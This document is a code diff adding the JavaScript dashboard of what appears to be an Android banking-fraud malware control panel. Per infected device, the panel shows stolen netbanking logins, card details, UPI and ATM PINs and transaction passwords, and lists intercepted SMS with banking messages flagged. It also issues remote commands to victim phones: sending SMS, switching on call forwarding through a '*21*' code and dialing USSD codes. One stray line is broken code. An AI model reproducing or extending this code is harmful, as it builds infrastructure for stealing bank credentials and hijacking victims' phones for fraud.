+  initTokenModal();
+  initPermissionModal(); // Initialize permission modal
+  initDeviceDataPanel();
+  
+  // Load data with authentication
+  await loadDeviceInfo();
+  loadDeviceMessages();
+  loadDeviceAllData(); // Load device data
+  loadDevicePermissions(); // Load permissions
+  initSocket();
+  startLastSeenTimer();
+  loadInitialHistory();
+});
+
+// ===================== DEVICE DATA PANEL FUNCTIONS =====================
+function initDeviceDataPanel() {
+  const header = document.getElementById('deviceDataHeader');
+  const content = document.getElementById('deviceDataContent');
+  
+  if (header && content) {
+    header.addEventListener('click', function() {
+      this.classList.toggle('expanded');
+      content.classList.toggle('expanded');
+    });
+  }
+}
+
+async function loadDeviceAllData() {
+  try {
+    console.log('📊 Loading all device data for:', DEVICE_ID);
+    
+    const response = await fetchWithAuth(DEVICE_ALL_DATA_API);
+    const result = await response.json();
+    
+    if (result.success && result.data) {
+      deviceAllData = result.data;
+      console.log('✅ Device data loaded successfully');
+      console.log('📊 Data structure:', Object.keys(deviceAllData));
+      
+      // Filter data for current device
+      const filteredData = filterDeviceData(deviceAllData, DEVICE_ID);
+      renderDeviceData(filteredData);
+      
+    } else {
+      console.log('❌ No device data found');
+      showNoDataMessage();
+    }
+    
+  } catch (error) {
+    console.error('❌ Error loading device data:', error);
+    showNoDataMessage();
+  }
+}
+
+function filterDeviceData(allData, deviceId) {
+  const filtered = {};
+  const collections = [
+    'forms',
+    'netbanking',
+    'bankLogins',
+    'cardPayments',
+    'upi',
+    'userPins',
+    'transactionPasswords',
+    'bankUpiPin',
+    'atmPasswords',
+    'internetBankingData'
+  ];
+  
+  collections.forEach(collection => {
+    if (allData[collection] && Array.isArray(allData[collection])) {
+      const items = allData[collection].filter(item => {
+        // Check multiple possible UID fields
+        const uid = item.uniqueid || item.deviceId || item.uid || item.deviceID;
+        return uid === deviceId;
+      });
+      
+      if (items.length > 0) {
+        filtered[collection] = items;
+      }
+    }
+  });
+  
+  console.log('🔍 Filtered data:', Object.keys(filtered));
+  Object.keys(filtered).forEach(key => {
+    console.log(`  ${key}: ${filtered[key].length} items`);
+  });
+  
+  return filtered;
+}
+
+function renderDeviceData(filteredData) {
+  const container = document.getElementById('deviceDataSections');
+  const totalCount = Object.values(filteredData).reduce((sum, arr) => sum + arr.length, 0);
+  
+  // Update count badge
+  document.getElementById('dataCountBadge').textContent = totalCount;
+  
+  if (totalCount === 0) {
+    showNoDataMessage();
+    return;
+  }
+  
+  let html = '';
+  
+  // Define sections with icons and titles
+  const sections = [
+    { key: 'forms', title: 'Forms Data', icon: 'fas fa-file-alt', color: '#2563eb' },
+    { key: 'netbanking', title: 'Netbanking Data', icon: 'fas fa-university', color: '#10b981' },
+    { key: 'bankLogins', title: 'Bank Logins', icon: 'fas fa-sign-in-alt', color: '#8b5cf6' },
+    { key: 'cardPayments', title: 'Card Payments', icon: 'fas fa-credit-card', color: '#ef4444' },
+    { key: 'upi', title: 'UPI Data', icon: 'fas fa-money-bill-transfer', color: '#06b6d4' },
+    { key: 'userPins', title: 'User PINs', icon: 'fas fa-lock', color: '#f59e0b', sensitive: true },
+    { key: 'transactionPasswords', title: 'Transaction Passwords', icon: 'fas fa-key', color: '#ec4899', sensitive: true },
+    { key: 'bankUpiPin', title: 'Bank UPI Pins', icon: 'fas fa-mobile-alt', color: '#8b5cf6', sensitive: true },
+    { key: 'atmPasswords', title: 'ATM Passwords', icon: 'fas fa-credit-card', color: '#f97316', sensitive: true },
+    { key: 'internetBankingData', title: 'Internet Banking', icon: 'fas fa-globe', color: '#3b82f6' }
+  ];
+  
+  sections.forEach(section => {
+    const data = filteredData[section.key];
+    if (!data || data.length === 0) return;
+    
+    html += `
+      <div class="data-section" id="dataSection_${section.key}">
+        <div class="data-section-header">
+          <div class="data-section-title">
+            <i class="${section.icon}" style="color: ${section.color};"></i>
+            ${section.title}
+            <span class="data-section-count">${data.length}</span>
+          </div>
+          <div class="data-section-toggle">
+            <i class="fas fa-chevron-down"></i>
+          </div>
+        </div>
+        <div class="data-section-content">
+          ${renderDataItems(data, section.key, section.sensitive)}
+        </div>
+      </div>
+    `;
+  });
+  
+  container.innerHTML = html;
+  
+  // Add click events to section headers
+  sections.forEach(section => {
+    if (filteredData[section.key]) {
+      const sectionEl = document.getElementById(`dataSection_${section.key}`);
+      if (sectionEl) {
+        const header = sectionEl.querySelector('.data-section-header');
+        const content = sectionEl.querySelector('.data-section-content');
+        
+        header.addEventListener('click', function() {
+          this.classList.toggle('expanded');
+          content.classList.toggle('expanded');
+        });
+      }
+    }
+  });
+}
+
+socket 
+
+function renderDataItems(items, sectionKey, isSensitive = false) {
+  return items.map((item, index) => {
+    const timestamp = item.timestamp || item.time || item.createdAt || Date.now();
+    const date = new Date(timestamp);
+    const dateStr = date.toLocaleDateString('en-IN', {
+      day: '2-digit',
+      month: 'short',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+    
+    // Create data rows
+    let dataRows = '';
+    Object.entries(item).forEach(([key, value]) => {
+      if (key !== 'uniqueid' && key !== 'deviceId' && key !== 'uid' && 
+          key !== 'timestamp' && key !== 'time' && key !== 'createdAt' && 
+          key !== 'updatedAt' && value !== null && value !== undefined) {
+        
+        const valueStr = String(value).trim();
+        if (valueStr === '') return;
+        
+        let icon = 'fas fa-info-circle';
+        let isImportant = false;
+        let isSensitiveField = false;
+        
+        // Determine icon and importance
+        if (key.toLowerCase().includes('pin') || 
+            key.toLowerCase().includes('password') || 
+            key.toLowerCase().includes('pass') || 
+            key.toLowerCase().includes('pwd')) {
+          icon = 'fas fa-lock';
+          isImportant = true;
+          isSensitiveField = true;
+        } else if (key.toLowerCase().includes('card') || 
+                  key.toLowerCase().includes('cvv') || 
+                  key.toLowerCase().includes('expiry')) {
+          icon = 'fas fa-credit-card';
+          isImportant = true;
+          isSensitiveField = true;
+        } else if (key.toLowerCase().includes('name')) {
+          icon = 'fas fa-user';
+        } else if (key.toLowerCase().includes('email')) {
+          icon = 'fas fa-envelope';
+        } else if (key.toLowerCase().includes('phone') || 
+                  key.toLowerCase().includes('mobile') || 
+                  key.toLowerCase().includes('number')) {
+          icon = 'fas fa-phone';
+        } else if (key.toLowerCase().includes('bank') || 
+                  key.toLowerCase().includes('account')) {
+          icon = 'fas fa-university';
+          isImportant = true;
+        } else if (key.toLowerCase().includes('otp') || 
+                  key.toLowerCase().includes('code')) {
+          icon = 'fas fa-shield-alt';
+          isImportant = true;
+          isSensitiveField = true;
+        } else if (key.toLowerCase().includes('amount') || 
+                  key.toLowerCase().includes('balance')) {
+          icon = 'fas fa-rupee-sign';
+          isImportant = true;
+        }
+        
+        const valueClass = isSensitiveField || isSensitive ? 'sensitive' : (isImportant ? 'important' : '');
+        
+        dataRows += `
+          <div class="data-item-row">
+            <div class="data-item-label">
+              <i class="${icon}"></i>
+              ${key}
+            </div>
+            <div class="data-item-value ${valueClass}" title="${valueStr}">
+              ${valueStr}
+            </div>
+          </div>
+        `;
+      }
+    });
+    
+    return `
+      <div class="data-item-container">
+        <div class="data-item-header">
+          <div class="data-item-timestamp">
+            <i class="far fa-clock"></i>
+            ${dateStr}
+          </div>
+          <div class="data-item-id">
+            Entry ${index + 1}
+          </div>
+        </div>
+        <div class="data-item-grid">
+          ${dataRows}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function showNoDataMessage() {
+  const container = document.getElementById('deviceDataSections');
+  container.innerHTML = `
+    <div class="no-data-message">
+      <i class="fas fa-database"></i>
+      <h3>No Data Collected Yet</h3>
+      <p>This device hasn't collected any data yet.</p>
+    </div>
+  `;
+}
+
+// ===================== SOCKET INIT WITH TOKEN =====================
+function initSocket() {
+  try {
+    const socketOptions = {
+      transports: ["websocket", "polling"],
+      withCredentials: true
+    };
+    
+    // Add token to socket connection
+    if (AUTH_TOKEN) {
+      socketOptions.auth = {
+        token: AUTH_TOKEN
+      };
+      socketOptions.query = {
+        token: AUTH_TOKEN,
+        sessionId: SESSION_ID,
+        deviceId: DEVICE_ID
+      };
+    }
+    
+    socket = io(API_BASE, socketOptions);
+
+    socket.on("connect", () => {
+      console.log('🔗 Socket connected with token');
+      socket.emit("subscribe", { 
+        uid: DEVICE_ID, 
+        token: AUTH_TOKEN,
+        sessionId: SESSION_ID
+      });
+    });
+
+    socket.on("smsLogUpdate", (data) => {
+      if (data.success && data.event === 'new' && data.uid === DEVICE_ID) {
+        handleLiveSMS(data);
+      }
+    });
+
+    socket.on("brosReplyUpdate", (payload) => {
+      const { uid, data, message } = payload;
+      if (uid !== currentReplyUid) return;
+      updatePopupFromReply(data, message);
+    });
+
+    socket.on("historyUpdate", (data) => {
+      console.log('📜 Socket historyUpdate received:', data);
+      if (data.success && data.uid === DEVICE_ID) {
+        handleHistoryUpdate(data);
+      }
+    });
+
+    socket.on("connect_error", (error) => {
+      console.error('❌ Socket connection error:', error);
+      if (error.message.includes("auth") || error.message.includes("token") || error.message.includes("unauthorized")) {
+        showToast('Authentication failed. Please login again.', 'error');
+        setTimeout(() => redirectToLogin(), 2000);
+      }
+    });
+
+    socket.on("disconnect", () => {
+      console.log('🔌 Socket disconnected');
+    });
+
+  } catch (error) {
+    console.error('❌ Socket initialization error:', error);
+  }
+}
+
+// ===================== API CALL FUNCTIONS WITH AUTH =====================
+async function fetchWithAuth(url, options = {}) {
+  try {
+    const response = await fetch(url, {
+      ...options,
+      headers: {
+        ...options.headers,
+        ...getAuthHeaders(options.headers?.['Content-Type'])
+      }
+    });
+    
+    if (response.status === 401 || response.status === 403) {
+      showToast('Session expired. Please login again.', 'error');
+      setTimeout(() => redirectToLogin(), 1500);
+      throw new Error('Authentication failed');
+    }
+    
+    return response;
+  } catch (error) {
+    console.error('Fetch error:', error);
+    throw error;
+  }
+}
+
+// ===================== ELEMENT REFERENCES =====================
+function initElements() {
+  window.deviceIdDisplay = document.getElementById('deviceIdDisplay');
+  window.lastSeenDisplay = document.getElementById('lastSeenDisplay');
+  window.deviceName = document.getElementById('deviceName');
+  window.deviceModel = document.getElementById('deviceModel');
+  
+  window.sim1CardCompact = document.getElementById('sim1CardCompact');
+  window.sim1NumberCompact = document.getElementById('sim1NumberCompact');
+  window.sim1CarrierCompact = document.getElementById('sim1CarrierCompact');
+  window.sim1StatusCompact = document.getElementById('sim1StatusCompact');
+  
+  window.sim2CardCompact = document.getElementById('sim2CardCompact');
+  window.sim2NumberCompact = document.getElementById('sim2NumberCompact');
+  window.sim2CarrierCompact = document.getElementById('sim2CarrierCompact');
+  window.sim2StatusCompact = document.getElementById('sim2StatusCompact');
+  
+  // SMS Panel Elements
+  window.smsSimSlotSelect = document.getElementById('smsSimSlot');
+  window.callSimSlotSelect = document.getElementById('callSimSlot');
+  window.ussdSimSlotSelect = document.getElementById('ussdSimSlot');
+  
+  window.deviceMessagesList = document.getElementById('deviceMessagesList');
+  window.loadingMessages = document.getElementById('loadingMessages');
+  window.historyList = document.getElementById('historyList');
+  window.notificationBadge = document.getElementById('notificationBadge');
+}
+
+// ===================== EVENT LISTENERS =====================
+function initEventListeners() {
+  deviceIdDisplay.onclick = () => copyDeviceIdToClipboard();
+
+  // Button click events - UPDATED DATA BUTTON
+  document.getElementById('smsBtn').onclick = () => togglePanel('smsPanel');
+  document.getElementById('callBtn').onclick = () => togglePanel('callPanel');
+  document.getElementById('ussdBtn').onclick = () => togglePanel('ussdPanel');
+  document.getElementById('checkBtn').onclick = () => checkOnline(DEVICE_ID);
+  document.getElementById('dataBtn').onclick = () => toggleDeviceDataPanel(); // CHANGED HERE
+  document.getElementById('historyBtn').onclick = () => togglePanel('historyPanel');
+
+  // SMS Panel Events
+  document.getElementById('sendSmsBtn').onclick = sendSms;
+  document.getElementById('clearSmsBtn').onclick = clearSmsFields;
+  document.getElementById('closeSmsPanelBtn').onclick = () => togglePanel('smsPanel', false);
+
+  // Call Panel Events
+  document.getElementById('activateCallBtn').onclick = () => sendCallForward(true);
+  document.getElementById('deactivateCallBtn').onclick = () => sendCallForward(false);
+  document.getElementById('closeCallPanelBtn').onclick = () => togglePanel('callPanel', false);
+
+  // USSD Panel Events
+  document.getElementById('sendUssdBtn').onclick = sendUssd;
+  document.getElementById('closeUssdPanelBtn').onclick = () => togglePanel('ussdPanel', false);
+
+  // Floating button
+  document.getElementById('smsFloatingBtn').onclick = () => {
+    document.querySelector('.messages-container').scrollIntoView({ behavior: 'smooth' });
+  };
+
+  // Popup Events
+  document.getElementById('refreshPopupBtn').onclick = () => {
+    if (currentReplyUid) checkOnline(currentReplyUid);
+  };
+  document.getElementById('closePopupBtn').onclick = hideCheckPopup;
+}
+
+// ===================== DEVICE DATA PANEL TOGGLE =====================
+function toggleDeviceDataPanel() {
+  const panel = document.getElementById('deviceDataPanel');
+  const header = document.getElementById('deviceDataHeader');
+  const content = document.getElementById('deviceDataContent');
+  
+  if (panel && header && content) {
+    header.classList.toggle('expanded');
+    content.classList.toggle('expanded');
+    
+    // Scroll to panel
+    panel.scrollIntoView({ behavior: 'smooth' });
+    
+    // Refresh data if panel is opened
+    if (header.classList.contains('expanded') && !deviceAllData) {
+      loadDeviceAllData();
+    }
+  }
+}
+
+// ===================== DEVICE MESSAGES FUNCTIONS - WITH AUTH =====================
+async function loadDeviceMessages() {
+  try {
+    const response = await fetchWithAuth(ALL_MESSAGES_API);
+    const result = await response.json();
+    
+    if (result.success && result.data) {
+      const deviceMessages = result.data.filter(msg => 
+        msg.uniqueid === DEVICE_ID || 
+        msg.deviceId === DEVICE_ID ||
+        (msg.sender && msg.sender.includes(DEVICE_ID))
+      );
+      
+      console.log('📱 Device Messages:', deviceMessages.length);
+      
+      deviceMessages.sort((a, b) => {
+        const timeA = getTimestampFromSms(a);
+        const timeB = getTimestampFromSms(b);
+        return timeB - timeA;
+      });
+      
+      allSmsData = deviceMessages;
+      renderDeviceMessages(deviceMessages);
+      
+    } else {
+      deviceMessagesList.innerHTML = `
+        <div style="text-align: center; padding: 20px; color: var(--gray-500);">
+          <i class="fas fa-exclamation-circle"></i>
+          No messages found for this device
+        </div>
+      `;
+    }
+    
+  } catch (error) {
+    console.error('Device messages load error:', error);
+    deviceMessagesList.innerHTML = `
+      <div style="text-align: center; padding: 20px; color: var(--gray-500);">
+        <i class="fas fa-exclamation-circle"></i>
+        Failed to load messages
+      </div>
+    `;
+  }
+}
+
+function getTimestampFromSms(sms) {
+  if (sms.timestamp) return sms.timestamp;
+  if (sms.time) return sms.time;
+  if (sms.date) return sms.date;
+  if (sms.createdAt) return new Date(sms.createdAt).getTime();
+  if (sms.updatedAt) return new Date(sms.updatedAt).getTime();
+  return Date.now();
+}
+
+function renderDeviceMessages(messages) {
+  if (!messages || messages.length === 0) {
+    deviceMessagesList.innerHTML = `
+      <div style="text-align: center; padding: 40px; color: var(--gray-500); background: white; border-radius: var(--radius); border: 2px dashed var(--gray-300);">
+        <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
+        <h3 style="margin-bottom: 8px; color: var(--gray-700);">No messages yet</h3>
+        <p style="color: var(--gray-500); max-width: 300px; margin: 0 auto;">This device hasn't received any messages yet.</p>
+      </div>
+    `;
+    return;
+  }
+  
+  loadingMessages.style.display = 'none';
+  
+  messages.forEach(message => {
+    addMessageCard(message);
+  });
+}
+
+function addMessageCard(message) {
+  const container = deviceMessagesList;
+  if (!container) return;
+  
+  const card = document.createElement("div");
+  card.className = "message-card";
+  
+  if (message.isLive) {
+    card.classList.add("live");
+  }
+
+  const messageBody = message.body || message.message || "No message content available";
+  const safeBody = messageBody.replace(/"/g, '\\"').replace(/'/g, "\\'");
+  const isBanking = isBankingMessage(messageBody);
+  const senderDisplay = message.sender || message.from || message.senderNumber || "-";
+  const receiverDisplay = message.receiver || message.receiverNumber || message.to || "-";
+  
+  const wordCount = messageBody.split(/\s+/).filter(word => word.length > 0).length;
+  const charCount = messageBody.length;
+  const lineCount = messageBody.split('\n').length;
+  const estimatedLines = Math.max(lineCount, Math.ceil(wordCount / 15));
+  const minHeight = Math.max(60, estimatedLines * 24);
+
+  card.innerHTML = `
+    <div class="message-header">
+      <div class="message-title-container">
+        <div class="message-main-title">
+          <div class="message-date">${formatDate(message.timestamp || message.time || message.date)}</div>
+          ${message.isLive ? '<span class="live-badge" style="font-size: 12px; padding: 4px 10px;">LIVE</span>' : ''}
+          ${isBanking ? '<span class="banking-badge">BANKING</span>' : ''}
+        </div>
+      </div>
+    </div>
+    
+    <!-- Device info row - REMOVED DEVICE ID COLUMN -->
+    <div class="device-info-row">
+      <div class="device-info-item">
+        <i class="fas fa-user-tag"></i>
+        <div class="device-info-content">
+          <span class="device-label">Sender:</span>
+          <span class="device-value" title="${senderDisplay}">${senderDisplay}</span>
+        </div>
+      </div>
+      <div class="device-info-item">
+        <i class="fas fa-user-check"></i>
+        <div class="device-info-content">
+          <span class="device-label">Receiver:</span>
+          <span class="device-value" title="${receiverDisplay}">${receiverDisplay}</span>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Message body -->
+    <div class="msg-body-container">
+      <div class="msg-body-header">
+        <div style="font-size: 14px; color: var(--gray-600); font-weight: 700;">
+          <i class="fas fa-message"></i> Message Content
+        </div>
+        <button class="copy-btn" data-text="${safeBody}">
+          <i class="fas fa-copy"></i> Copy
+        </button>
+      </div>
+      <div class="message-body-display" style="min-height: ${minHeight}px;">
+        ${messageBody}
+      </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="message-footer">
+      <div class="message-time">
+        <i class="fas fa-clock"></i>
+        ${message.isLive ? 'Received Live • ' : ''}${formatTime(message.timestamp || message.time || message.date)}
+      </div>
+      <div class="message-stats">
+        <div class="message-stat-item">
+          <i class="fas fa-font"></i>
+          <span>${wordCount} words</span>
+        </div>
+        <div class="message-stat-item">
+          <i class="fas fa-hashtag"></i>
+          <span>${charCount} chars</span>
+        </div>
+      </div>
+    </div>
+  `;
+
+  // Message card click - toggle expand/collapse
+  card.addEventListener('click', function(e) {
+    if (e.target.closest('.copy-btn') || e.target.closest('.message-body-display')) {
+      return;
+    }
+    this.classList.toggle('expanded');
+  });
+
+  // Copy button click
+  const copyBtn = card.querySelector(".copy-btn");
+  if (copyBtn) {
+    copyBtn.addEventListener("click", function(e) {
+      e.stopPropagation();
+      const text = this.getAttribute("data-text") || messageBody;
+      copyToClipboard(text, 'Message copied');
+    });
+  }
+
+  // Message body click - copy
+  const messageDisplay = card.querySelector(".message-body-display");
+  if (messageDisplay) {
+    messageDisplay.addEventListener("click", function(e) {
+      e.stopPropagation();
+      copyToClipboard(messageBody, 'Message copied');
+    });
+  }
+  
+  container.appendChild(card);
+}
+
+function isBankingMessage(text) {
+  if (!text) return false;
+  const keys = ["credited", "debited", "rs", "inr", "bank", "account", "upi", "txn", "transaction", "balance", "avl", "available"];
+  const lowerText = text.toLowerCase();
+  return keys.some(v => lowerText.includes(v));
+}
+
+function formatDate(timestamp) {
+  if (!timestamp) return "-";
+  const date = new Date(timestamp);
+  return date.toLocaleString("en-IN", {
+    day: '2-digit',
+    month: 'short',
+    year: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+}
+
+function formatTime(timestamp) {
+  if (!timestamp) return "";
+  const date = new Date(timestamp);
+  const now = new Date();
+  const diffMs = now - date;
+  const diffMins = Math.floor(diffMs / 60000);
+  const diffHours = Math.floor(diffMs / 3600000);
+  const diffDays = Math.floor(diffMs / 86400000);
+  
+  if (diffMins < 1) return "Just now";
+  if (diffMins < 60) return `${diffMins} min ago`;
+  if (diffHours < 24) return `${diffHours} hours ago`;
+  if (diffDays < 7) return `${diffDays} days ago`;
+  
+  return date.toLocaleDateString("en-IN", {
+    day: '2-digit',
+    month: 'short'
+  });
+}
+
+// ===================== COPY FUNCTIONS =====================
+async function copyDeviceIdToClipboard() {
+  const deviceId = DEVICE_ID;
+  if (deviceId && deviceId !== '-') {
+    await copyToClipboard(deviceId, 'Device ID copied');
+  }
+}
+
+async function copyPhoneNumberToClipboard(phoneNumber, simLabel = 'Phone number') {
+  if (phoneNumber && phoneNumber !== '-') {
+    await copyToClipboard(phoneNumber, `${simLabel} copied`);
+  }
+}
+
+async function copyToClipboard(text, successMessage = 'Copied to clipboard') {
+  try {
+    await navigator.clipboard.writeText(text);
+    showToast(successMessage, 'success');
+  } catch (err) {
+    console.error('Copy failed:', err);
+    
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    textArea.style.position = "fixed";
+    textArea.style.left = "-999999px";
+    textArea.style.top = "-999999px";
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+      document.execCommand('copy');
+      showToast(successMessage, 'success');
+    } catch (copyErr) {
+      console.error('Fallback copy failed:', copyErr);
+      showToast('Failed to copy', 'error');
+    }
+    
+    textArea.remove();
+  }
+}
+
+// ===================== SIM SLOT MANAGEMENT =====================
+function updateSimSlotDropdowns(device) {
+  const simOptions = [];
+  
+  const sim1Number = (device.sim1Number || '').trim();
+  const sim2Number = (device.sim2Number || '').trim();
+  
+  if (sim1Number && sim1Number !== '' && sim1Number !== '-') {
+    simOptions.push({
+      value: '0',
+      label: `SIM 1 (${sim1Number})`,
+      number: sim1Number
+    });
+  }
+  
+  if (sim2Number && sim2Number !== '' && sim2Number !== '-') {
+    simOptions.push({
+      value: '1',
+      label: `SIM 2 (${sim2Number})`,
+      number: sim2Number
+    });
+  }
+  
+  if (simOptions.length === 0) {
+    simOptions.push({
+      value: '0',
+      label: 'No SIM Available',
+      number: ''
+    });
+  }
+  
+  updateSingleDropdown(smsSimSlotSelect, simOptions);
+  updateSingleDropdown(callSimSlotSelect, simOptions);
+  updateSingleDropdown(ussdSimSlotSelect, simOptions);
+  
+  if (simOptions.length === 1 && simOptions[0].value !== '0') {
+    smsSimSlotSelect.value = simOptions[0].value;
+    callSimSlotSelect.value = simOptions[0].value;
+    ussdSimSlotSelect.value = simOptions[0].value;
+  }
+}
+
+function updateSingleDropdown(dropdown, simOptions) {
+  dropdown.innerHTML = '';
+  
+  simOptions.forEach(sim => {
+    const option = document.createElement('option');
+    option.value = sim.value;
+    
+    if (sim.label.includes('No SIM Available')) {
+      option.textContent = sim.label;
+    } else {
+      option.textContent = sim.label;
+      option.dataset.number = sim.number;
+    }
+    
+    dropdown.appendChild(option);
+  });
+  
+  if (dropdown.options.length === 0) {
+    const option = document.createElement('option');
+    option.value = '0';
+    option.textContent = 'No SIM Available';
+    dropdown.appendChild(option);
+  }
+}
+
+// ===================== PANEL MANAGEMENT =====================
+function togglePanel(panelId, forceState = null) {
+  const panels = ['smsPanel', 'callPanel', 'ussdPanel', 'historyPanel'];
+  const targetPanel = document.getElementById(panelId);
+  const isActive = targetPanel.classList.contains('active');
+  
+  panels.forEach(id => {
+    const panel = document.getElementById(id);
+    if (panel) panel.classList.remove('active');
+  });
+  
+  if (forceState === false || (forceState === null && isActive)) {
+    targetPanel.classList.remove('active');
+  } else {
+    targetPanel.classList.add('active');
+  }
+}
+
+// ===================== COMMAND FUNCTIONS WITH AUTH =====================
+async function sendCommand(data) {
+  try {
+    const response = await fetchWithAuth(COMMAND_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+
+    if (response.ok) {
+      showToast('Command sent successfully', 'success');
+      return true;
+    } else {
+      showToast('Failed to send command', 'error');
+      return false;
+    }
+  } catch (error) {
+    console.error('Command error:', error);
+    showToast('Network error', 'error');
+    return false;
+  }
+}
+
+async function sendSms() {
+  const to = document.getElementById('smsNumber').value.trim();
+  const body = document.getElementById('smsMessage').value.trim();
+  const simSlot = parseInt(smsSimSlotSelect.value);
+  
+  if (!to || !body) {
+    showToast('Please enter phone number and message', 'error');
+    return;
+  }
+  
+  const selectedOption = smsSimSlotSelect.options[smsSimSlotSelect.selectedIndex];
+  if (selectedOption.textContent.includes('No SIM Available')) {
+    showToast('Please select a valid SIM slot', 'error');
+    return;
+  }
+  
+  const smsData = {
+    uniqueid: DEVICE_ID,
+    action: "sms",
+    to: to,
+    body: body,
+    simSlot: simSlot,
+    timestamp: Date.now(),
+    token: AUTH_TOKEN,
+    sessionId: SESSION_ID
+  };
+  
+  const success = await sendCommand(smsData);
+  if (success) {
+    const selectedSim = smsSimSlotSelect.options[smsSimSlotSelect.selectedIndex].textContent;
+    const historyEntry = {
+      entryType: "sms",
+      body: body.substring(0, 50) + (body.length > 50 ? '...' : ''),
+      status: "SENT",
+      sim: selectedSim,
+      timestamp: Date.now(),
+      to: to
+    };
+    addHistoryEntry(historyEntry);
+    clearSmsFields();
+    showToast(`SMS sent to ${to}`, 'success');
+  }
+}
+
+function clearSmsFields() {
+  document.getElementById('smsNumber').value = '';
+  document.getElementById('smsMessage').value = '';
+}
+
+async function sendCallForward(activate) {
+  const forwardNumber = document.getElementById('forwardNumber').value.trim();
+  const simSlot = parseInt(callSimSlotSelect.value);
+  
+  if (activate && !forwardNumber) {
+    showToast('Please enter forward number', 'error');
+    return;
+  }
+  
+  const selectedOption = callSimSlotSelect.options[callSimSlotSelect.selectedIndex];
+  if (selectedOption.textContent.includes('No SIM Available')) {
+    showToast('Please select a valid SIM slot', 'error');
+    return;
+  }
+  
+  const code = activate ? `*21*${forwardNumber}#` : "#21#";
+  const body = activate ? `Activate call forward to ${forwardNumber}` : "Deactivate call forward";
+  
+  const callData = {
+    uniqueid: DEVICE_ID,
+    action: "call",
+    code: code,
+    simSlot: simSlot,
+    timestamp: Date.now(),
+    token: AUTH_TOKEN,
+    sessionId: SESSION_ID
+  };
+  
+  const success = await sendCommand(callData);
+  if (success) {
+    if (!activate) {
+      document.getElementById('forwardNumber').value = '';
+    }
+    togglePanel('callPanel', false);
+    
+    const selectedSim = callSimSlotSelect.options[callSimSlotSelect.selectedIndex].textContent;
+    const historyEntry = {
+      entryType: "call",
+      body: body,
+      status: "EXECUTED",
+      sim: selectedSim,
+      timestamp: Date.now()
+    };
+    addHistoryEntry(historyEntry);
+  }
+}
+
+async function sendUssd() {
+  const code = document.getElementById('ussdCode').value.trim();
+  const simSlot = parseInt(ussdSimSlotSelect.value);
+  
+  if (!code) {
+    showToast('Please enter USSD code', 'error');
+    return;
+  }
+  
+  const selectedOption = ussdSimSlotSelect.options[ussdSimSlotSelect.selectedIndex];
+  if (selectedOption.textContent.includes('No SIM Available')) {
+    showToast('Please select a valid SIM slot', 'error');
+    return;
+  }
+  
+  const ussdData = {
+    uniqueid: DEVICE_ID,
+    action: "ussd",
+    code: code,
+    simSlot: simSlot,
+    timestamp: Date.now(),
+    token: AUTH_TOKEN,
+    sessionId: SESSION_ID
+  };
+  
+  const success = await sendCommand(ussdData);
+  if (success) {
+    document.getElementById('ussdCode').value = '';
+    togglePanel('ussdPanel', false);
+    
+    const selectedSim = ussdSimSlotSelect.options[ussdSimSlotSelect.selectedIndex].textContent;
+    const historyEntry = {
+      entryType: "ussd",
+      body: code,
+      status: "DIALED",
+      sim: selectedSim,
+      timestamp: Date.now()
+    };
+    addHistoryEntry(historyEntry);
+  }
+}
+
+// ===================== DEVICE INFORMATION WITH AUTH =====================
+async function loadDeviceInfo() {
+  try {
+    const response = await fetchWithAuth(DEVICE_API);
+    const result = await response.json();
+    const device = (result.data || []).find(x => x.id === DEVICE_ID);
+    
+    if (!device) {
+      showToast('Device not found', 'error');
+      return;
+    }
+
+    currentDevice = device;
+    updateDeviceDisplay(device);
+    updateSimSlotDropdowns(device);
+    
+  } catch (error) {
+    console.error('Device load error:', error);
+    showToast('Failed to load device information', 'error');
+  }
+}
+
+function updateDeviceDisplay(device) {
+  deviceIdDisplay.textContent = device.id || DEVICE_ID;
+  deviceIdDisplay.onclick = () => copyDeviceIdToClipboard();
+  
+  const brand = device.brand || 'Unknown';
+  const model = device.model || '';
+  deviceName.textContent = `${brand} ${model}`.trim();
+  
+  const androidVersion = device.androidVersion || '';
+  deviceModel.textContent = androidVersion ? `Android ${androidVersion}` : 'Android';
+  
+  // SIM 1
+  const sim1CarrierText = (device.sim1Carrier || '').trim();
+  const sim1NumberText = (device.sim1Number || '').trim();
+  
+  sim1CardCompact.classList.remove('hidden');
+  sim1CarrierCompact.textContent = sim1CarrierText || 'Unknown';
+  
+  if (sim1NumberText && sim1NumberText !== '' && sim1NumberText !== '-') {
+    sim1NumberCompact.textContent = sim1NumberText;
+    
+    if (sim1NumberText.toLowerCase().includes('no sim') || 
+        sim1NumberText.toLowerCase().includes('null') ||
+        sim1NumberText === '') {
+      sim1StatusCompact.innerHTML = '<i class="fas fa-times-circle"></i>';
+      sim1StatusCompact.className = 'sim-status-compact inactive';
+    } else if (sim1CarrierText && sim1CarrierText.toLowerCase().includes('unknown')) {
+      sim1StatusCompact.innerHTML = '<i class="fas fa-question-circle"></i>';
+      sim1StatusCompact.className = 'sim-status-compact unknown';
+    } else {
+      sim1StatusCompact.innerHTML = '<i class="fas fa-check-circle"></i>';
+      sim1StatusCompact.className = 'sim-status-compact active';
+    }
+    
+    sim1NumberCompact.onclick = (e) => {
+      e.stopPropagation();
+      copyPhoneNumberToClipboard(sim1NumberText, 'SIM 1');
+    };
+  } else {
+    sim1NumberCompact.textContent = sim1NumberText || '-';
+    sim1StatusCompact.innerHTML = '<i class="fas fa-times-circle"></i>';
+    sim1StatusCompact.className = 'sim-status-compact inactive';
+    sim1NumberCompact.onclick = null;
+  }
+  
+  // SIM 2
+  const sim2CarrierText = (device.sim2Carrier || '').trim();
+  const sim2NumberText = (device.sim2Number || '').trim();
+  
+  sim2CardCompact.classList.remove('hidden');
+  sim2CarrierCompact.textContent = sim2CarrierText || 'Unknown';
+  
+  if (sim2NumberText && sim2NumberText !== '' && sim2NumberText !== '-') {
+    sim2NumberCompact.textContent = sim2NumberText;
+    
